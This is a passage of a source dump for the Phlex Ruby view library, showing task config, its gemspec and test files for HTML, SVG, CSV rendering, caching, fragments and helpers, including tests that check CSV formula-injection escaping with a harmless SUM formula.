 3 | run = ["mise install", "bundle install --jobs 4"]
 4 |
 5 | [tasks.test]
 6 | description = "Run tests"
 7 | run = ["bundle exec sus", "bundle exec qt"]
 8 |
 9 | [tasks.lint]
10 | description = "Run linter"
11 | run = "bundle exec rubocop"
12 |
13 | [tasks.integrate]
14 | description = "Run tests and linter"
15 | run = ["mise run test", "mise run lint"]
16 |
17 | [tasks.update]
18 | description = "Update project dependencies"
19 | run = ["mise upgrade --bump", "bundle update --jobs 4"]
20 |
21 | [tasks.bench]
22 | description = "Run benchmarks"
23 | run = ["bundle exec ./bench.rb"]
24 |
25 | [tasks.browser_tests]
26 | description = "Run browser tests"
27 | run = ["bundle exec ./browser_tests.rb"]
28 |


--------------------------------------------------------------------------------
/phlex.gemspec:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | require_relative "lib/phlex/version"
 4 |
 5 | Gem::Specification.new do |spec|
 6 | 	spec.name = "phlex"
 7 | 	spec.version = Phlex::VERSION
 8 | 	spec.authors = ["Joel Drapper", "Will Cosgrove"]
 9 | 	spec.email = ["joel@drapper.me"]
10 |
11 | 	spec.summary = "Object-oriented views in Ruby."
12 | 	spec.description = "Build HTML, SVG and CSV views with Ruby classes."
13 | 	spec.homepage = "https://www.phlex.fun"
14 | 	spec.license = "MIT"
15 | 	spec.required_ruby_version = ">= 3.2"
16 |
17 | 	spec.metadata["homepage_uri"] = spec.homepage
18 | 	spec.metadata["source_code_uri"] = "https://github.com/phlex-ruby/phlex"
19 | 	spec.metadata["changelog_uri"] = "https://github.com/phlex-ruby/phlex/releases"
20 | 	spec.metadata["funding_uri"] = "https://github.com/sponsors/joeldrapper"
21 | 	spec.metadata["rubygems_mfa_required"] = "true"
22 |
23 | 	spec.files = Dir[
24 | 		"README.md",
25 | 		"LICENSE.txt",
26 | 		"lib/**/*.rb"
27 | 	]
28 |
29 | 	spec.require_paths = ["lib"]
30 |
31 | 	spec.add_runtime_dependency "zeitwerk", "~>2.7"
32 | end
33 |


--------------------------------------------------------------------------------
/quickdraw/attribute_cache_expansion.test.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | test "using a component without a source location" do
 4 | 	refute_raises do
 5 | 		# Intentionally not passing a source location here.
 6 | 		eval <<~RUBY
 7 | 			class Example < Phlex::HTML
 8 | 				def view_template
 9 | 				end
10 | 			end
11 | 		RUBY
12 | 	end
13 | end
14 |


--------------------------------------------------------------------------------
/quickdraw/caching.test.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | CacheStore = Phlex::FIFOCacheStore.new
 4 |
 5 | class CacheTest < Phlex::HTML
 6 | 	def cache_store = CacheStore
 7 |
 8 | 	def initialize(execution_watcher)
 9 | 		@execution_watcher = execution_watcher
10 | 	end
11 |
12 | 	def view_template
13 | 		cache do
14 | 			@execution_watcher.call
15 | 			"OK"
16 | 		end
17 | 	end
18 | end
19 |
20 | test "caching a block only executes once" do
21 | 	run_count = 0
22 | 	monitor = -> { run_count += 1 }
23 | 	CacheTest.new(monitor).call
24 | 	assert_equal run_count, 1
25 | 	CacheTest.new(monitor).call
26 | 	assert_equal run_count, 1
27 | end
28 |


--------------------------------------------------------------------------------
/quickdraw/context.test.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | test "user context passed in from the outside" do
 4 | 	example = Class.new(Phlex::HTML) do
 5 | 		define_method :view_template do
 6 | 			h1 { context[:heading] }
 7 | 		end
 8 | 	end
 9 |
10 | 	context = { heading: "Hello, World!" }
11 | 	assert_equal_html example.new.call(context:), %(<h1>Hello, World!</h1>)
12 | end
13 |
14 | test "user context passed down" do
15 | 	a = Class.new(Phlex::HTML) do
16 | 		define_method :view_template do
17 | 			h1 { context[:heading] }
18 | 		end
19 | 	end
20 |
21 | 	b = Class.new(Phlex::HTML) do
22 | 		define_method :view_template do
23 | 			context[:heading] = "Hello, World!"
24 | 			render a.new
25 | 		end
26 | 	end
27 |
28 | 	assert_equal_html b.new.call, %(<h1>Hello, World!</h1>)
29 | end
30 |
31 | test "raises an ArgumentError if you access the context before rendering" do
32 | 	component = Phlex::HTML.new
33 |
34 | 	error = assert_raises(Phlex::ArgumentError) { component.context }
35 |
36 | 	assert_equal error.message, <<~MESSAGE
37 | 		You can’t access the context before the component has started rendering.
38 | 	MESSAGE
39 | end
40 |


--------------------------------------------------------------------------------
/quickdraw/csv.test.rb:
--------------------------------------------------------------------------------
  1 | # frozen_string_literal: true
  2 |
  3 | Product = Struct.new(:name, :price)
  4 |
  5 | class Base < Phlex::CSV
  6 | 	def row_template(product)
  7 | 		column("name", product.name)
  8 | 		column("price", product.price)
  9 | 	end
 10 | end
 11 |
 12 | products = [
 13 | 	Product.new("Apple", 1.00),
 14 | 	Product.new(" Banana ", 2.00),
 15 | 	Product.new(:strawberry, "Three pounds"),
 16 | 	Product.new("=SUM(A1:B1)", "=SUM(A1:B1)"),
 17 | 	Product.new("Abc, \"def\"", "Foo\nbar \"baz\""),
 18 | 	Product.new("", ""),
 19 | 	Product.new(nil, nil),
 20 | ]
 21 |
 22 | test "don’t escape csv injection or trim whitespace" do
 23 | 	example = Class.new(Base) do
 24 | 		define_method(:escape_csv_injection?) { false }
 25 | 		define_method(:trim_whitespace?) { false }
 26 | 	end
 27 |
 28 | 	assert_equal example.new(products).call, <<~CSV
 29 | 		name,price
 30 | 		Apple,1.0
 31 | 		" Banana ",2.0
 32 | 		strawberry,Three pounds
 33 | 		=SUM(A1:B1),=SUM(A1:B1)
 34 | 		"Abc, ""def""","Foo\nbar ""baz"""
 35 | 		"",""
 36 | 		"",""
 37 | 	CSV
 38 | end
 39 |
 40 | test "don’t escape csv injection, but do trim whitespace" do
 41 | 	example = Class.new(Base) do
 42 | 		define_method(:escape_csv_injection?) { false }
 43 | 		define_method(:trim_whitespace?) { true }
 44 | 	end
 45 |
 46 | 	assert_equal example.new(products).call, <<~CSV
 47 | 		name,price
 48 | 		Apple,1.0
 49 | 		Banana,2.0
 50 | 		strawberry,Three pounds
 51 | 		=SUM(A1:B1),=SUM(A1:B1)
 52 | 		Abc, "def",Foo\nbar "baz"
 53 | 		,
 54 | 		,
 55 | 	CSV
 56 | end
 57 |
 58 | test "escape csv injection, but don’t trim whitespace" do
 59 | 	example = Class.new(Base) do
 60 | 		define_method(:escape_csv_injection?) { true }
 61 | 		define_method(:trim_whitespace?) { false }
 62 | 	end
 63 |
 64 | 	assert_equal example.new(products).call, <<~CSV
 65 | 		name,price
 66 | 		Apple,1.0
 67 | 		" Banana ",2.0
 68 | 		strawberry,Three pounds
 69 | 		"'=SUM(A1:B1)","'=SUM(A1:B1)"
 70 | 		"Abc, ""def""","Foo
 71 | 		bar ""baz"""
 72 | 		"",""
 73 | 		"",""
 74 | 	CSV
 75 | end
 76 |
 77 | test "escape csv injection and trim whitespace" do
 78 | 	example = Class.new(Base) do
 79 | 		define_method(:escape_csv_injection?) { true }
 80 | 		define_method(:trim_whitespace?) { true }
 81 | 	end
 82 |
 83 | 	assert_equal example.new(products).call, <<~CSV
 84 | 		name,price
 85 | 		Apple,1.0
 86 | 		Banana,2.0
 87 | 		strawberry,Three pounds
 88 | 		"'=SUM(A1:B1)","'=SUM(A1:B1)"
 89 | 		"Abc, ""def""","Foo
 90 | 		bar ""baz"""
 91 | 		,
 92 | 		,
 93 | 	CSV
 94 | end
 95 |
 96 | test "no headers" do
 97 | 	example = Class.new(Base) do
 98 | 		define_method(:render_headers?) { false }
 99 | 		define_method(:escape_csv_injection?) { false }
100 | 	end
101 |
102 | 	assert_equal example.new(products).call, <<~CSV
103 | 		Apple,1.0
104 | 		" Banana ",2.0
105 | 		strawberry,Three pounds
106 | 		=SUM(A1:B1),=SUM(A1:B1)
107 | 		"Abc, ""def""","Foo
108 | 		bar ""baz"""
109 | 		"",""
110 | 		"",""
111 | 	CSV
112 | end
113 |
114 | test "with a custom around_row" do
115 | 	example = Class.new(Phlex::CSV) do
116 | 		def escape_csv_injection? = true
117 |
118 | 		def around_row(item)
119 | 			super(item.name, item.price)
120 | 		end
121 |
122 | 		def row_template(name, price)
123 | 			column "Name", name
124 | 			column "Price", price
125 | 		end
126 | 	end
127 |
128 | 	assert_equal example.new(products).call, <<~CSV
129 | 		Name,Price
130 | 		Apple,1.0
131 | 		" Banana ",2.0
132 | 		strawberry,Three pounds
133 | 		"'=SUM(A1:B1)","'=SUM(A1:B1)"
134 | 		"Abc, ""def""","Foo
135 | 		bar ""baz"""
136 | 		"",""
137 | 		"",""
138 | 	CSV
139 | end
140 |
141 | test "with an around_row that calls super more than once" do
142 | 	example = Class.new(Phlex::CSV) do
143 | 		def escape_csv_injection? = true
144 | 		def trim_whitespace? = false
145 |
146 | 		def around_row(item)
147 | 			super(item.name, item.price)
148 | 			super(item.name, item.price)
149 | 		end
150 |
151 | 		def row_template(name, price)
152 | 			column "Name", name
153 | 			column "Price", price
154 | 		end
155 | 	end
156 |
157 | 	assert_equal example.new(products).call, <<~CSV
158 | 		Name,Price
159 | 		Apple,1.0
160 | 		Apple,1.0
161 | 		" Banana ",2.0
162 | 		" Banana ",2.0
163 | 		strawberry,Three pounds
164 | 		strawberry,Three pounds
165 | 		"'=SUM(A1:B1)","'=SUM(A1:B1)"
166 | 		"'=SUM(A1:B1)","'=SUM(A1:B1)"
167 | 		"Abc, ""def""","Foo\nbar ""baz"""
168 | 		"Abc, ""def""","Foo\nbar ""baz"""
169 | 		"",""
170 | 		"",""
171 | 		"",""
172 | 		"",""
173 | 	CSV
174 | end
175 |
176 | test "with a yielder that yields more than once" do
177 | 	example = Class.new(Phlex::CSV) do
178 | 		def escape_csv_injection? = true
179 | 		def trim_whitespace? = false
180 |
181 | 		def yielder(item)
182 | 			yield(item.name, item.price)
183 | 			yield(item.name, item.price)
184 | 		end
185 |
186 | 		def row_template(name, price)
187 | 			column "Name", name
188 | 			column "Price", price
189 | 		end
190 | 	end
191 |
192 | 	assert_equal example.new(products).call, <<~CSV
193 | 		Name,Price
194 | 		Apple,1.0
195 | 		Apple,1.0
196 | 		" Banana ",2.0
197 | 		" Banana ",2.0
198 | 		strawberry,Three pounds
199 | 		strawberry,Three pounds
200 | 		"'=SUM(A1:B1)","'=SUM(A1:B1)"
201 | 		"'=SUM(A1:B1)","'=SUM(A1:B1)"
202 | 		"Abc, ""def""","Foo\nbar ""baz"""
203 | 		"Abc, ""def""","Foo\nbar ""baz"""
204 | 		"",""
205 | 		"",""
206 | 		"",""
207 | 		"",""
208 | 	CSV
209 | end
210 |
211 | test "with a custom delimiter defined as a method" do
212 | 	example = Class.new(Phlex::CSV) do
213 | 		define_method(:escape_csv_injection?) { true }
214 | 		define_method(:trim_whitespace?) { true }
215 | 		define_method(:delimiter) { ";" }
216 | 		define_method(:row_template) do |product|
217 | 			column "Name", product.name
218 | 			column "Price", product.price
219 | 		end
220 | 	end
221 |
222 | 	assert_equal example.new(products).call, <<~CSV
223 | 		Name;Price
224 | 		Apple;1.0
225 | 		Banana;2.0
226 | 		strawberry;Three pounds
227 | 		"'=SUM(A1:B1)";"'=SUM(A1:B1)"
228 | 		"Abc, ""def""";"Foo
229 | 		bar ""baz"""
230 | 		;
231 | 		;
232 | 	CSV
233 | end
234 |
235 | test "with a custom delimiter passed in as an argument" do
236 | 	example = Class.new(Phlex::CSV) do
237 | 		define_method(:escape_csv_injection?) { true }
238 | 		define_method(:trim_whitespace?) { true }
239 | 		define_method(:row_template) do |product|
240 | 			column "Name", product.name
241 | 			column "Price", product.price
242 | 		end
243 | 	end
244 |
245 | 	assert_equal example.new(products).call(delimiter: ";"), <<~CSV
246 | 		Name;Price
247 | 		Apple;1.0
248 | 		Banana;2.0
249 | 		strawberry;Three pounds
250 | 		"'=SUM(A1:B1)";"'=SUM(A1:B1)"
251 | 		"Abc, ""def""";"Foo
252 | 		bar ""baz"""
253 | 		;
254 | 		;
255 | 	CSV
256 | end
257 |
258 | test "with an invalid custom delimiter" do
259 | 	example = Class.new(Base) do
260 | 		define_method(:escape_csv_injection?) { true }
261 | 	end
262 |
263 | 	error = assert_raises(Phlex::ArgumentError) do
264 | 		example.new([]).call(delimiter: "invalid")
265 | 	end
266 |
267 | 	assert_equal error.message, "Delimiter must be a single character"
268 | end
269 |
270 | test "content type" do
271 | 	assert_equal Base.new([]).content_type, "text/csv"
272 | end
273 |
274 | test "filename is nil by default" do
275 | 	assert_equal Base.new([]).filename, nil
276 | end
277 |
278 | test "raises an error if there's no escape plan" do
279 | 	error = assert_raises(RuntimeError) do
280 | 		Base.new([]).call
281 | 	end
282 |
283 | 	assert_includes error.message, "escape_csv_injection?"
284 | end
285 |


--------------------------------------------------------------------------------
/quickdraw/erb.test.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | class Example < Phlex::HTML
 4 | 	def initialize
 5 | 		@text = "text"
 6 | 		@html = safe "<div>html</div>"
 7 | 	end
 8 |
 9 | 	erb :view_template, <<~ERB
10 | 		<% card do %>
11 | 			<h1><%= @text %></h1>
12 | 			<%= @html %>
13 | 			<%= phlex_snippet %>
14 | 		<% end %>
15 | 	ERB
16 |
17 | 	erb :erb_snippet, <<~ERB, locals: %(text:)
18 | 		<h2>Goodbye <%= text %></h2>
19 | 	ERB
20 |
21 | 	def phlex_snippet
22 | 		p { "How do you do?" }
23 | 	end
24 |
25 | 	def card
26 | 		section do
27 | 			article do
28 | 				yield
29 | 			end
30 | 			erb_snippet(text: "Joel")
31 | 		end
32 | 	end
33 | end
34 |
35 | test do
36 | 	output = Example.call
37 |
38 | 	assert_equivalent_html output, <<~HTML
39 | 		<section>
40 | 			<article>
41 | 				<h1>text</h1>
42 | 				<div>html</div>
43 | 				<p>How do you do?</p>
44 | 			</article>
45 | 			<h2>Goodbye Joel</h2>
46 | 		</section>
47 | 	HTML
48 | end
49 |


--------------------------------------------------------------------------------
/quickdraw/fifo.test.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | test "expires keys" do
 4 | 	fifo = Phlex::FIFO.new(max_bytesize: 3)
 5 |
 6 | 	100.times do |i|
 7 | 		fifo[i] = "a"
 8 | 	end
 9 |
10 | 	assert_equal fifo.size, 3
11 | end
12 |
13 | test "reading a key" do
14 | 	fifo = Phlex::FIFO.new(max_bytesize: 3)
15 |
16 | 	fifo[0] = "a"
17 |
18 | 	assert_equal fifo[0], "a"
19 | end
20 |
21 | test "ignores values that are too large" do
22 | 	fifo = Phlex::FIFO.new(max_bytesize: 100, max_value_bytesize: 10)
23 |
24 | 	fifo[1] = "a" * 10
25 | 	fifo[2] = "a" * 11
26 |
27 | 	assert_equal fifo.size, 1
28 | end
29 |


--------------------------------------------------------------------------------
/quickdraw/fifo_cache_store.test.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | test "fetch caches the yield" do
 4 | 	store = Phlex::FIFOCacheStore.new
 5 | 	count = 0
 6 |
 7 | 	first_read = store.fetch("a") do
 8 | 		count += 1
 9 | 		"A"
10 | 	end
11 |
12 | 	assert_equal first_read, "A"
13 | 	assert_equal count, 1
14 |
15 | 	second_read = store.fetch("a") do
16 | 		failure! { "This block should not have been called." }
17 | 		"B"
18 | 	end
19 |
20 | 	assert_equal second_read, "A"
21 | 	assert_equal count, 1
22 | end
23 |
24 | test "nested caches do not lead to contention" do
25 | 	store = Phlex::FIFOCacheStore.new
26 |
27 | 	result = store.fetch("a") do
28 | 		[
29 | 			"A",
30 | 			store.fetch("b") { "B" },
31 | 		].join(", ")
32 | 	end
33 |
34 | 	assert_equal result, "A, B"
35 | end
36 |


--------------------------------------------------------------------------------
/quickdraw/helpers/grab.test.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | include Phlex::Helpers
 4 |
 5 | test "single binding" do
 6 | 	output = grab(class: "foo")
 7 | 	assert_equal output, "foo"
 8 | end
 9 |
10 | test "multiple bindings" do
11 | 	output = grab(class: "foo", if: "bar")
12 | 	assert_equal output, ["foo", "bar"]
13 | end
14 |


--------------------------------------------------------------------------------
/quickdraw/helpers/mix.test.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | include Phlex::Helpers
 4 |
 5 | test "nil + string" do
 6 | 	output = mix({ class: nil }, { class: "a" })
 7 | 	assert_equal output, { class: "a" }
 8 | end
 9 |
10 | test "string + nil" do
11 | 	output = mix({ class: "a" }, { class: nil })
12 | 	assert_equal output, { class: "a" }
13 | end
14 |
15 | test "array + nil" do
16 | 	output = mix({ class: ["foo", "bar"] }, { class: nil })
17 | 	assert_equal output, { class: ["foo", "bar"] }
18 | end
19 |
20 | test "array + array" do
21 | 	output = mix({ class: ["foo"] }, { class: ["bar"] })
22 | 	assert_equal output, { class: ["foo", "bar"] }
23 | end
24 |
25 | test "array + set" do
26 | 	output = mix({ class: ["foo"] }, { class: Set["bar"] })
27 | 	assert_equal output, { class: ["foo", "bar"] }
28 | end
29 |
30 | test "array + hash" do
31 | 	output = mix(
32 | 		{ data: ["foo"] },
33 | 		{ data: { controller: "bar" } },
34 | 	)
35 |
36 | 	assert_equal output, { data: { _: ["foo"], controller: "bar" } }
37 | end
38 |
39 | test "array + string" do
40 | 	output = mix({ class: ["foo"] }, { class: "bar" })
41 | 	assert_equal output, { class: ["foo", "bar"] }
42 | end
43 |
44 | test "hash + hash" do
45 | 	output = mix(
46 | 		{ data: { controller: "foo" } },
47 | 		{ data: { controller: "bar" } },
48 | 	)
49 |
50 | 	assert_equal output, { data: { controller: "foo bar" } }
51 | end
52 |
53 | test "string + array" do
54 | 	output = mix({ class: "foo" }, { class: ["bar"] })
55 | 	assert_equal output, { class: ["foo", "bar"] }
56 | end
57 |
58 | test "string + string" do
59 | 	output = mix({ class: "foo" }, { class: "bar" })
60 | 	assert_equal output, { class: "foo bar" }
61 | end
62 |
63 | test "string + set" do
64 | 	output = mix({ class: "foo" }, { class: Set["bar"] })
65 | 	assert_equal output, { class: ["foo", "bar"] }
66 | end
67 |
68 | test "override" do
69 | 	output = mix({ class: "foo" }, { class!: "bar" })
70 | 	assert_equal output, { class: "bar" }
71 | end
72 |
73 | test "set + set" do
74 | 	output = mix({ class: Set["foo"] }, { class: Set["bar"] })
75 | 	assert_equal output, { class: Set["foo", "bar"] }
76 | end
77 |
78 | test "set + array" do
79 | 	output = mix({ class: Set["foo"] }, { class: ["bar"] })
80 | 	assert_equal output, { class: ["foo", "bar"] }
81 | end
82 |
83 | test "set + string" do
84 | 	output = mix({ class: Set["foo"] }, { class: "bar" })
85 | 	assert_equal output, { class: ["foo", "bar"] }
86 | end
87 |


--------------------------------------------------------------------------------
/quickdraw/html.test.rb:
--------------------------------------------------------------------------------
1 | # frozen_string_literal: true
2 |
3 | test "content type" do
4 | 	component = Class.new(Phlex::HTML)
5 |
6 | 	assert_equal component.new.content_type, "text/html"
7 | end
8 |


--------------------------------------------------------------------------------
/quickdraw/html/doctype.test.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | class Example < Phlex::HTML
 4 | 	def view_template
 5 | 		html {
 6 | 			head {
 7 | 				doctype
 8 | 			}
 9 | 		}
10 | 	end
11 | end
12 |
13 | test do
14 | 	assert_equal Example.call, "<html><head><!doctype html></head></html>"
15 | end
16 |


--------------------------------------------------------------------------------
/quickdraw/html/standard_elements.test.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | Phlex::HTML::StandardElements.__registered_elements__.each do |method_name, tag|
 4 | 	test "<#{tag}> with block content and attributes" do
 5 | 		example = Class.new(Phlex::HTML) do
 6 | 			define_method :view_template do
 7 | 				__send__(method_name, class: "class", id: "id", disabled: true, selected: false) { h1 { "Hello" } }
 8 | 			end
 9 | 		end
10 |
11 | 		assert_equal example.call, %(<#{tag} class="class" id="id" disabled><h1>Hello</h1></#{tag}>)
12 | 	end
13 |
14 | 	test "<#{tag}> with block text content and attributes" do
15 | 		example = Class.new(Phlex::HTML) do
16 | 			define_method :view_template do
17 | 				__send__(method_name, class: "class", id: "id", disabled: true, selected: false) { "content" }
18 | 			end
19 | 		end
20 |
21 | 		assert_equal example.call, %(<#{tag} class="class" id="id" disabled>content</#{tag}>)
22 | 	end
23 |
24 | 	test "<#{tag}> with string attribute keys" do
25 | 		example = Class.new(Phlex::HTML) do
26 | 			define_method :view_template do
27 | 				__send__(method_name, "attribute_with_underscore" => true) { "content" }
28 | 			end
29 | 		end
30 |
31 | 		assert_equal example.call, %(<#{tag} attribute_with_underscore>content</#{tag}>)
32 | 	end
33 |
34 | 	test "<#{tag}> with hash attribute values" do
35 | 		example = Class.new(Phlex::HTML) do
36 | 			define_method :view_template do
37 | 				__send__(method_name, aria: { hidden: true }, data_turbo: { frame: "_top" }) { "content" }
38 | 			end
39 | 		end
40 |
41 | 		assert_equal example.call, %(<#{tag} aria-hidden data-turbo-frame="_top">content</#{tag}>)
42 | 	end
43 | end
44 |


--------------------------------------------------------------------------------
/quickdraw/html/svg.test.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | class Example < Phlex::HTML
 4 | 	def view_template
 5 | 		svg do |s|
 6 | 			s.path(d: "321")
 7 | 		end
 8 | 	end
 9 | end
10 |
11 | class ExampleWithoutContent < Phlex::HTML
12 | 	def view_template
13 | 		svg
14 | 	end
15 | end
16 |
17 | test "rendering SVG without content" do
18 | 	assert_equal %(<svg></svg>), ExampleWithoutContent.call
19 | end
20 |
21 | test "rendering SVG inside HTML components" do
22 | 	assert_equal %(<svg><path d="321"></path></svg>), Example.call
23 | end
24 |


--------------------------------------------------------------------------------
/quickdraw/html/void_elements.test.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | Phlex::HTML::VoidElements.__registered_elements__.each do |method_name, tag|
 4 | 	test "<#{tag}> with attributes" do
 5 | 		example = Class.new(Phlex::HTML) do
 6 | 			define_method :view_template do
 7 | 				__send__(method_name, class: "class", id: "id", disabled: true, selected: false)
 8 | 			end
 9 | 		end
10 |
11 | 		assert_equal(example.call, %(<#{tag} class="class" id="id" disabled>))
12 | 	end
13 |
14 | 	test "<#{tag}> with string attribute keys" do
15 | 		example = Class.new(Phlex::HTML) do
16 | 			define_method :view_template do
17 | 				__send__(method_name, "attribute_with_underscore" => true)
18 | 			end
19 | 		end
20 |
21 | 		assert_equal(example.call, %(<#{tag} attribute_with_underscore>))
22 | 	end
23 |
24 | 	test "<#{tag}> with hash attribute values" do
25 | 		example = Class.new(Phlex::HTML) do
26 | 			define_method :view_template do
27 | 				__send__(method_name, aria: { hidden: true }, data_turbo: { frame: "_top" })
28 | 			end
29 | 		end
30 |
31 | 		assert_equal(example.call, %(<#{tag} aria-hidden data-turbo-frame="_top">))
32 | 	end
33 | end
34 |


--------------------------------------------------------------------------------
/quickdraw/inline.test.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | test "inline html with no param" do
 4 | 	output = Phlex.html do
 5 | 		h1 { "Hi" }
 6 | 	end
 7 |
 8 | 	assert_equal_html output, <<~HTML.strip
 9 | 		<h1>Hi</h1>
10 | 	HTML
11 | end
12 |
13 | def title = "Hello"
14 |
15 | test "inline html with a yield param" do
16 | 	@ivar = "Hi"
17 | 	h1 = "foo"
18 |
19 | 	output = Phlex.html do |receiver|
20 | 		h1 { h1 }
21 | 		h1 { @ivar }
22 | 		title { receiver.title }
23 | 	end
24 |
25 | 	assert_equal_html output, <<~HTML.strip
26 | 		<h1>foo</h1><h1>Hi</h1><title>Hello</title>
27 | 	HTML
28 | end
29 |


--------------------------------------------------------------------------------
/quickdraw/kit.test.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | require "components"
 4 | require "sgml_helper"
 5 | include SGMLHelper
 6 |
 7 | class Example < Phlex::HTML
 8 | 	include Components
 9 |
10 | 	def view_template
11 | 		SayHi("Joel", times: 2) { "Inside" }
12 | 		Components::SayHi("Will", times: 1) { "Inside" }
13 | 	end
14 | end
15 |
16 | test "raises when you try to render a component outside of a rendering context" do
17 | 	error = assert_raises(RuntimeError) { Components::SayHi("Joel") }
18 | 	assert_equal error.message, "You can't call `SayHi' outside of a Phlex rendering context."
19 | end
20 |
21 | test "defines methods for its components" do
22 | 	assert_equal Example.new.call, %(<article><h1>Hi Joel</h1><h1>Hi Joel</h1>Inside</article><article><h1>Hi Will</h1>Inside</article>)
23 | end
24 |
25 | test "nested kits" do
26 | 	assert_equal_html phlex { Components::Foo::Bar() }, "<h1>Bar</h1>"
27 | end
28 |


--------------------------------------------------------------------------------
/quickdraw/selective_rendering_from_cache.test.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | class CacheTest < Phlex::HTML
 4 | 	attr_reader :cache_store
 5 |
 6 | 	def initialize(page_id, cache_store:)
 7 | 		@page_id = page_id
 8 | 		@cache_store = cache_store
 9 | 	end
10 |
11 | 	def view_template
12 | 		cache(@page_id) do
13 | 			h1 { "Page #{@page_id}" }
14 | 			fragment("outer") do
15 | 				div(id: "page") do
16 | 					cache do
17 | 						section do
18 | 							fragment("list") do
19 | 								ul do
20 | 									fragment("foo") { li { 1 } }
21 | 									li { 2 }
22 | 									li { 3 }
23 | 								end
24 | 							end
25 | 						end
26 | 					end
27 | 				end
28 | 			end
29 | 		end
30 | 	end
31 | end
32 |
33 | test "rendering a component with caches and fragments" do
34 | 	cache_store = Phlex::FIFOCacheStore.new
35 | 	output = CacheTest.new(1, cache_store:).call
36 | 	assert_equal_html output, "<h1>Page 1</h1><div id=\"page\"><section><ul><li>1</li><li>2</li><li>3</li></ul></section></div>"
37 |
38 | 	output = CacheTest.new(1, cache_store:).call
39 | 	assert_equal_html output, "<h1>Page 1</h1><div id=\"page\"><section><ul><li>1</li><li>2</li><li>3</li></ul></section></div>"
40 | end
41 |
42 | test "rendering a component with caches and fragments" do
43 | 	cache_store = Phlex::FIFOCacheStore.new
44 | 	output = CacheTest.new(1, cache_store:).call
45 | 	assert_equal_html output, "<h1>Page 1</h1><div id=\"page\"><section><ul><li>1</li><li>2</li><li>3</li></ul></section></div>"
46 |
47 | 	output = CacheTest.new(2, cache_store:).call
48 | 	assert_equal_html output, "<h1>Page 2</h1><div id=\"page\"><section><ul><li>1</li><li>2</li><li>3</li></ul></section></div>"
49 | end
50 |
51 | test "rendering a specific fragment from within a cache" do
52 | 	cache_store = Phlex::FIFOCacheStore.new
53 | 	2.times do
54 | 		output = CacheTest.new(2, cache_store:).call(fragments: ["list"])
55 | 		assert_equal_html output, "<ul><li>1</li><li>2</li><li>3</li></ul>"
56 | 	end
57 | end
58 |
59 | test "rendering a nested fragment from within a cache" do
60 | 	cache_store = Phlex::FIFOCacheStore.new
61 | 	output = CacheTest.new(1, cache_store:).call(fragments: ["foo"])
62 | 	assert_equal_html output, "<li>1</li>"
63 | end
64 |
65 | test "rendering multiple fragments from within a cache" do
66 | 	cache_store = Phlex::FIFOCacheStore.new
67 | 	output = CacheTest.new(1, cache_store:).call(fragments: ["list", "foo"])
68 | 	assert_equal_html output, "<ul><li>1</li><li>2</li><li>3</li></ul>"
69 | end
70 |
71 | test "rendering multiple fragments out of order from within a cache" do
72 | 	cache_store = Phlex::FIFOCacheStore.new
73 | 	output = CacheTest.new(1, cache_store:).call(fragments: ["foo", "list"])
74 | 	assert_equal_html output, "<ul><li>1</li><li>2</li><li>3</li></ul>"
75 | end
76 |
77 | test "cache contains full value if initially rendered as a fragment" do
78 | 	cache_store = Phlex::FIFOCacheStore.new
79 | 	output = CacheTest.new(1, cache_store:).call(fragments: ["foo"])
80 | 	assert_equal_html output, "<li>1</li>"
81 |
82 | 	output = CacheTest.new(1, cache_store:).call
83 | 	assert_equal_html output, "<h1>Page 1</h1><div id=\"page\"><section><ul><li>1</li><li>2</li><li>3</li></ul></section></div>"
84 | end
85 |
86 | test "fetching a nested fragment from a cached value" do
87 | 	cache_store = Phlex::FIFOCacheStore.new
88 | 	CacheTest.new(1, cache_store:).call # Cache the outer cache for key = 1, and the inner cache for all other keys
89 | 	output = CacheTest.new(2, cache_store:).call(fragments: ["foo"])
90 | 	assert_equal_html output, "<li>1</li>"
91 | end
92 |


--------------------------------------------------------------------------------
/quickdraw/sgml.test.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | test "components render with a default blank view_template" do
 4 | 	component = Class.new(Phlex::HTML) do
 5 | 		def view_template
 6 | 		end
 7 | 	end
 8 |
 9 | 	assert_equal component.new.call, ""
10 | end
11 |
12 | test "components with old `template` method render warning" do
13 | 	component = Class.new(Phlex::HTML) do
14 | 		def template
15 | 			span "old template"
16 | 		end
17 | 	end
18 |
19 | 	assert_equal component.new.call, Phlex::Escape.html_escape(
20 | 		%(Phlex Warning: Your `#{component.name}` class doesn't define a `view_template` method. If you are upgrading to Phlex 2.x make sure to rename your `template` method to `view_template`. See: https://beta.phlex.fun/guides/v2-upgrade.html)
21 | 	)
22 | end
23 |
24 | test "components with no `view_template` method render warning" do
25 | 	component = Class.new(Phlex::HTML)
26 |
27 | 	assert_equal component.new.call, Phlex::Escape.html_escape(
28 | 		%(Phlex Warning: Your `#{component.name}` class doesn't define a `view_template` method. If you are upgrading to Phlex 2.x make sure to rename your `template` method to `view_template`. See: https://beta.phlex.fun/guides/v2-upgrade.html)
29 | 	)
30 | end
31 |
32 | test "can't render a component more than once" do
33 | 	component = Class.new(Phlex::HTML)
34 |
35 | 	instance = component.new
36 | 	instance.call
37 |
38 | 	assert_raises(Phlex::DoubleRenderError) { instance.call }
39 | end
40 |


--------------------------------------------------------------------------------
/quickdraw/sgml/attributes.test.rb:
